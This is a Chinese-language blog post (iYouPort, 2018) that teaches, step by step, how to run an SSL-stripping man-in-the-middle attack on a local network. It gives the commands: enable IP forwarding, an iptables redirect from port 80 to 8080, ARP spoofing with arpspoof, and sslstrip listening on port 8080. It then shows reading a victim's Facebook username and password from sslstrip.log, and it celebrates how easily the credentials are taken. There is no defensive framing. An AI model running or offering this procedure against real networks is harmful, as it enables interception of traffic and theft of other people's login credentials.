---
layout: post
title: "如何利用 sslstrip 对 HTTPS 连接发起中间人攻击？ - iYouPort"
date: 2018-07-28T04:39:49+00:00
author: iYouPort
from: https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8-sslstrip-%e5%af%b9-https-%e8%bf%9e%e6%8e%a5%e5%8f%91%e8%b5%b7%e4%b8%ad%e9%97%b4%e4%ba%ba%e6%94%bb%e5%87%bb%ef%bc%9f/
tags: [ iYouPort ]
categories: [ iYouPort ]
---

<article class="post-7038 post type-post status-publish format-standard has-post-thumbnail hentry category-newsletters category-289 tag-attacks tag-hacking tag-technology" id="post-7038">
 <header class="entry-header">
  <h1 class="entry-title">
   如何利用 sslstrip 对 HTTPS 连接发起中间人攻击？
  </h1>
 </header>
 <div class="entry-meta">
  <span class="byline">
   <a href="https://www.iyouport.org/author/don-evans/" rel="author" title="由McCaffrey发布">
    McCaffrey
   </a>
  </span>
  <span class="cat-links">
   <a href="https://www.iyouport.org/category/newsletters/" rel="category tag">
    Newsletters
   </a>
   ,
   <a href="https://www.iyouport.org/category/%e6%8a%80%e6%9c%af/" rel="category tag">
    技术
   </a>
  </span>
  <span class="published-on">
   <time class="entry-date published" datetime="2018-07-28T12:39:49+08:00">
    2018年7月28日
   </time>
   <time class="updated" datetime="2019-07-28T12:56:48+08:00">
    2019年7月28日
   </time>
  </span>
  <span class="word-count">
   0 Minutes
  </span>
 </div>
 <div class="entry-content">
  <p>
   🐞利用 SSLStrip 发起中间人攻击可以透明的劫持网络中的 http 流量，查找 HTTPS 链接并重定向，然后将这些链接映射到类似的 HTTP 链接中或者同形的 HTTPS 链接。怎么做？实际上非常简单……
  </p>
  <p>
   <img alt="" class="aligncenter size-full wp-image-7046 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1100%2C620&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?w=1502&amp;ssl=1 1502w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=768%2C433&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1024%2C577&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1100%2C620&amp;ssl=1 1100w" data-recalc-dims="1" height="620" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1100%2C620&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-7046" data-recalc-dims="1" height="620" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1100%2C620&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?w=1502&amp;ssl=1 1502w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=768%2C433&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1024%2C577&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-52.png?resize=1100%2C620&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   利用 SSLStrip 发起中间人攻击可以透明地劫持网络中的 http 流量，查找 HTTPS 链接并重定向，然后将这些链接映射到类似的 HTTP 链接中或者同形的 HTTPS 链接。
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   它还支持提供类似锁定图标，选择性日志记录和拒绝会话的模式。
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step1
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   首先我们将设备设置为转发模式，这样我们的设备就可以转发目标不是我们设备的数据包。
  </p>
  <pre class="_3I8mR _1J-OE _2p1aK _2R0Lu _2Dym_">echo 1&gt;/proc/sys/net/ipv4/ip_forward</pre>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step2
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   还需要设置 iptables，将流量从 80 端口重定向到 8080 端口，确保出站连接发送到 sslstrip 中。
  </p>
  <pre class="_3I8mR _1J-OE _2p1aK _2R0Lu _2Dym_">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</pre>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step3
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   需要找到我们的网关
  </p>
  <pre class="_3I8mR _1J-OE _2p1aK _2R0Lu _2Dym_">route -n</pre>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   前三步如图所示
  </p>
  <div class="q2uC4">
   <div class="_2CvYQ Slk8p _1K2V0 _1K2V0 _3ciQ2 t10mC t10mC">
    <div class="_1Lhwj _2SZw6 image-container" data-hook="imageViewer">
     <img alt="" class="aligncenter size-full wp-image-7039 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1100%2C727&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?w=1506&amp;ssl=1 1506w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=768%2C508&amp;ssl=1 768w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1024%2C677&amp;ssl=1 1024w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1100%2C727&amp;ssl=1 1100w" data-recalc-dims="1" height="727" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1100%2C727&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
     <noscript>
      <img alt="" class="aligncenter size-full wp-image-7039" data-recalc-dims="1" height="727" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1100%2C727&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?w=1506&amp;ssl=1 1506w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=768%2C508&amp;ssl=1 768w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1024%2C677&amp;ssl=1 1024w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-45.png?resize=1100%2C727&amp;ssl=1 1100w" width="1100"/>
     </noscript>
    </div>
   </div>
  </div>
  <div data-hook="imageViewer">
  </div>
  <div data-hook="imageViewer">
   <strong>
    step4
   </strong>
  </div>
  <div data-hook="imageViewer">
   <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
    接下来我们需要找到目标主机的 IP 地址
   </p>
   <p>
    <img alt="" class="aligncenter size-full wp-image-7040 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1100%2C543&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?w=1504&amp;ssl=1 1504w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=300%2C148&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=768%2C379&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1024%2C505&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1100%2C543&amp;ssl=1 1100w" data-recalc-dims="1" height="543" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1100%2C543&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
    <noscript>
     <img alt="" class="aligncenter size-full wp-image-7040" data-recalc-dims="1" height="543" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1100%2C543&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?w=1504&amp;ssl=1 1504w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=300%2C148&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=768%2C379&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1024%2C505&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-46.png?resize=1100%2C543&amp;ssl=1 1100w" width="1100"/>
    </noscript>
   </p>
  </div>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step5
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   攻击者利用ARP欺骗技术将虚假的ARP消息发送到局域网中。
  </p>
  <pre class="_3I8mR _1J-OE _2p1aK _2R0Lu _2Dym_">arpspoof -i -t</pre>
  <p>
   <img alt="" class="aligncenter size-full wp-image-7041 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1100%2C728&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?w=1502&amp;ssl=1 1502w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=300%2C199&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=768%2C508&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1024%2C678&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1100%2C728&amp;ssl=1 1100w" data-recalc-dims="1" height="728" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1100%2C728&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-7041" data-recalc-dims="1" height="728" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1100%2C728&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?w=1502&amp;ssl=1 1502w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=300%2C199&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=768%2C508&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1024%2C678&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-47.png?resize=1100%2C728&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step 6
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   现在我们打开一个新的终端并监听 8080 端口，命令如下
  </p>
  <pre class="_3I8mR _1J-OE _2p1aK _2R0Lu _2Dym_">sslstrip -l 8080</pre>
  <p>
   <img alt="" class="aligncenter size-full wp-image-7043 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1100%2C733&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?w=1506&amp;ssl=1 1506w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1100%2C733&amp;ssl=1 1100w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=272%2C182&amp;ssl=1 272w" data-recalc-dims="1" height="733" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1100%2C733&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-7043" data-recalc-dims="1" height="733" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1100%2C733&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?w=1506&amp;ssl=1 1506w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=1100%2C733&amp;ssl=1 1100w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-49.png?resize=272%2C182&amp;ssl=1 272w" width="1100"/>
   </noscript>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step 7
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   现在我们转到受害主机中，并且在浏览器中输入
   <a class="_2qJYG blog-link-hashtag-color _3sz0l" href="https://facebook.com/" rel="noreferrer noopener" target="_top">
    facebook.com
   </a>
   ，我们知道 Facebook 本来是使用的 HTTPS 协议，但是这里我们看到与 Facebook 是通过 http 建立的连接。
  </p>
  <p>
   <img alt="" class="aligncenter size-full wp-image-7044 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1100%2C557&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?w=1510&amp;ssl=1 1510w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=768%2C389&amp;ssl=1 768w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1024%2C518&amp;ssl=1 1024w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1100%2C557&amp;ssl=1 1100w" data-recalc-dims="1" height="557" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1100%2C557&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-7044" data-recalc-dims="1" height="557" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1100%2C557&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?w=1510&amp;ssl=1 1510w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=768%2C389&amp;ssl=1 768w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1024%2C518&amp;ssl=1 1024w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-50.png?resize=1100%2C557&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    step 8
   </strong>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   现在，返回到home目录，查看 sslstrip.log 日志文件，我们可以看到受害者登录时输入的用户名和密码，如图：
  </p>
  <p>
   <img alt="" class="aligncenter size-full wp-image-7045 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1100%2C794&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?w=1188&amp;ssl=1 1188w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=300%2C217&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=768%2C555&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1024%2C740&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1100%2C794&amp;ssl=1 1100w" data-recalc-dims="1" height="794" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1100%2C794&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-7045" data-recalc-dims="1" height="794" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1100%2C794&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?w=1188&amp;ssl=1 1188w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=300%2C217&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=768%2C555&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1024%2C740&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/07/0-51.png?resize=1100%2C794&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   嗯。就是这么 easy，现在就拿到了受害者的凭证。
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   更多 kali Linux 教程，请参考：
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    ·
   </strong>
   Lynis—
   <a class="_2qJYG blog-link-hashtag-color _3sz0l" href="https://gbhackers.com/lynis-open-source-security-auditing-tool-a-detailed-explanation/" rel="noopener noreferrer" target="_top">
    开源安全审计工具详解
   </a>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    ·
   </strong>
   sqlmap-
   <a class="_2qJYG blog-link-hashtag-color _3sz0l" href="https://gbhackers.com/sqlmap-detecting-exploiting-sql-injection/" rel="noopener noreferrer" target="_top">
    检测和利用 SQL 注入详解
   </a>
  </p>
  <p class="XzvDs _208Ie _2Dym_ blog-post-text-font blog-post-text-color _2p1aK _2R0Lu _2Dym_">
   <strong>
    ·
   </strong>
   HPING3—
   <a class="_2qJYG blog-link-hashtag-color _3sz0l" href="https://gbhackers.com/hping3-network-scanner-packer-generator/" rel="noopener noreferrer" target="_top">
    网络扫描器-包生成器
   </a>
  </p>
  <div id="atatags-1611829871-5f3edd6a969cc">
  </div>
  <div class="sharedaddy sd-sharing-enabled">
   <div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing">
    <h3 class="sd-title">
     共享此文章：
    </h3>
    <div class="sd-content">
     <ul>
      <li class="share-twitter">
       <a class="share-twitter sd-button share-icon no-text" data-shared="sharing-twitter-7038" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8-sslstrip-%e5%af%b9-https-%e8%bf%9e%e6%8e%a5%e5%8f%91%e8%b5%b7%e4%b8%ad%e9%97%b4%e4%ba%ba%e6%94%bb%e5%87%bb%ef%bc%9f/?share=twitter" rel="nofollow noopener noreferrer" target="_blank" title="点击以在 Twitter 上共享">
        <span>
        </span>
        <span class="sharing-screen-reader-text">
         点击以在 Twitter 上共享（在新窗口中打开）
        </span>
       </a>
      </li>
      <li class="share-facebook">
       <a class="share-facebook sd-button share-icon no-text" data-shared="sharing-facebook-7038" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8-sslstrip-%e5%af%b9-https-%e8%bf%9e%e6%8e%a5%e5%8f%91%e8%b5%b7%e4%b8%ad%e9%97%b4%e4%ba%ba%e6%94%bb%e5%87%bb%ef%bc%9f/?share=facebook" rel="nofollow noopener noreferrer" target="_blank" title="点击以在 Facebook 上共享">
        <span>
        </span>
        <span class="sharing-screen-reader-text">
         点击以在 Facebook 上共享（在新窗口中打开）
        </span>
       </a>
      </li>
      <li class="share-end">
      </li>
     </ul>
    </div>
   </div>
  </div>
  <div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" data-name="like-post-frame-161182987-7038-5f3edd6a96ad1" data-src="https://widgets.wp.com/likes/#blog_id=161182987&amp;post_id=7038&amp;origin=www.iyouport.org&amp;obj_id=161182987-7038-5f3edd6a96ad1" id="like-post-wrapper-161182987-7038-5f3edd6a96ad1">
   <h3 class="sd-title">
    赞过：
   </h3>
   <div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;">
    <span class="button">
     <span>
      赞
     </span>
    </span>
    <span class="loading">
     正在加载……
    </span>
   </div>
   <span class="sd-text-color">
   </span>
   <a class="sd-link-color">
   </a>
  </div>
  <div class="jp-relatedposts" id="jp-relatedposts">
   <h3 class="jp-relatedposts-headline">
    <em>
     相关
    </em>
   </h3>
  </div>
 </div>
 <div class="entry-footer">
  <ul class="post-tags light-text">
   <li>
    Tagged
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/attacks/" rel="tag">
     attacks
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/hacking/" rel="tag">
     hacking
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/technology/" rel="tag">
     Technology
    </a>
   </li>
  </ul>
 </div>
 <div class="entry-author-wrapper">
  <div class="site-posted-on">
   <strong>
    Published
   </strong>
   <time class="entry-date published" datetime="2018-07-28T12:39:49+08:00">
    2018年7月28日
   </time>
   <time class="updated" datetime="2019-07-28T12:56:48+08:00">
    2019年7月28日
   </time>
  </div>
 </div>
</article>

